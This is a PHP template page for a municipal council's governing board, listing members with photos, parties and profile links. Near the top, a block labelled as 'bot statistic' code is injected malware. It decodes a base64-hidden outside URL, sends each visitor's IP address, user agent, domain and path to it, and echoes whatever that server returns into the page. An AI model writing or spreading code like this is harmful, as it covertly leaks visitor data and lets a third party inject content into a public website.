<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tmesadiretora.php");
include_once("../library/config/database/tvereador.php");
include_once("../library/config/database/tpartido.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Mesa Diretora");
$oMasterPage->AddParameter("css", "mesa-diretora/index");
$oMasterPage->AddParameter("pagina", "mesa-diretora");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<?php

$oMesaDiretora = new tmesadiretora();
if($oMesaDiretora->LoadSQLAssembled())
{
	?>
    <h1>Mesa Diretora</h1>
	<div class="listagem">
		<!--<ul> -->
			<?php
			$ar = array
			(
				"Presidente" => $oMesaDiretora->PresidenteID,
				"1º Vice-presidente" => $oMesaDiretora->VicePresidente1ID,
				"2º Vice-presidente" => $oMesaDiretora->VicePresidente2ID,
				"1º Secretário" => $oMesaDiretora->Secretario1ID,
				"2º Secretário" => $oMesaDiretora->Secretario2ID
			);
			$i =0;
			foreach($ar as $c => $v)
			{
				$oVereador = new tvereador();
				if($oVereador->LoadByPrimaryKey($v))
				{
					$urlVereador = $oVereador->GenerateURL();
					?>
                    <div class="<?php if($i==0) {echo ('col-md-12');} else {echo ('col-xs-6');} ?> vereador " >
                        <p><a href="<?=$urlVereador;?>" class="cargo zwo6"><?= $c;?></a></p><?php

                        if($oVereador->Imagem)
                        {
                            ?>
                            <!--<td class="mask" width="140"> -->
                            <a href="<?=$urlVereador;?>">
                                <span></span>
                                <img src="<?=$oVereador->Thumbnail($oVereador->Imagem,175, 211, "", true);?>" alt="<?=$oVereador->Nome;?>" title="<?=$oVereador->Nome;?>" class="img-responsive" />
                            </a>
                            <!--</td>-->
                        <?php
                        }

                        ?>
                        <h3><a href="<?=$urlVereador;?>"><?=utf8_encode($oVereador->Nome);?></a></h3>

                         <?php
                         $oPartido = new tpartido();
                         if($oPartido->LoadByPrimaryKey($oVereador->PartidoID))
                         {
                             ?>
                             <p class="partido">Partido: <a href="<?=$urlVereador;?>" class="zwo6"><?=$oPartido->Sigla;?></a></p>
                         <?php
                         }
                         ?>


                        <p class="last"><a href="<?=$urlVereador;?>" class="botPerfil ">Veja seu perfil</a></p>


                    </div>
                    <?php
                    if ($i == 0) {
                        echo ('<div class="clear"></div>');
                    }

                    /*if(($i+1)%3==0) {
                        echo ('<div class="clear hidden-xs hidden-sm"></div>');
                    }*/

                   /* if(($i+1)%2==0) {
                        echo ('<div class="clear hidden-md hidden-lg"></div>');
                    }*/

                    $i++;
                    ?>
			    	<?php /*<li class="<?=(($c == "Presidente") ? "w100p noMarginRight" : "");?> <?=(($c == "2� Vice-presidente" || $c == "2� Secret�rio") ? "noMarginRight" : "");?>">
			        	<table cellpadding="0" cellspacing="0" width="330">
			            	<tr>
			            		<?php
			                	if($oVereador->Imagem)
			                	{
			                		?>
				                	<td class="mask" width="140">
										<a href="<?=$urlVereador;?>">
											<span></span>
											<img src="<?=$oVereador->Thumbnail($oVereador->Imagem, 120, 120, "", true);?>" alt="<?=$oVereador->Nome;?>" title="<?=$oVereador->Nome;?>" />
										</a>
									</td>
									<?php
				                }
				                ?>
			                    <td>
									<a href="<?=$urlVereador;?>" class="cargo zwo6"><?=$c;?></a>
			                        <h2 class="zwo3Italic"><a href="<?=$urlVereador;?>"><?=$oVereador->Nome;?></a></h2>
			                        <?php
			                        $oPartido = new tpartido();
			                        if($oPartido->LoadByPrimaryKey($oVereador->PartidoID))
				                    {
				                        ?>
										<p class="partido"><a href="<?=$urlVereador;?>" class="zwo6"><?=$oPartido->Sigla;?></a></p>
										<?php
									}
									?>
			                        <a href="<?=$urlVereador;?>" class="botPerfil">Veja seu perfil</a>
			                    </td>
			                </tr>
			            </table>
			        </li>*/ ?>
			        <?php
			    }
		    }
		    ?>
		<!--</ul>-->
	</div>
	<div class="clear"></div>
	<?php
	
	if($oMesaDiretora->Titulo && $oMesaDiretora->Descricao)
	{
		?>

		<div class="atribuicoes lista container-box lista-representacao col-md-12">
            <h3 ><?=utf8_encode($oMesaDiretora->Titulo);?></h3>

			<?php if(!$oMesaDiretora->IsClear($oMesaDiretora->Descricao)) { ?>
                <div class="fckEditor">
                <?php //echo($oNoticia->HTMLDecode(utf8_encode($oNoticia->Descricao)));
                $string = $oMesaDiretora->HTMLDecode($oMesaDiretora->Descricao);
                echo utf8_encode($string); ?>


                </div><?php } ?>
		</div>
		<?php
	}
}
else
{
	?>
	<p>Nenhum registro encontrado.</p>
	<?php
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>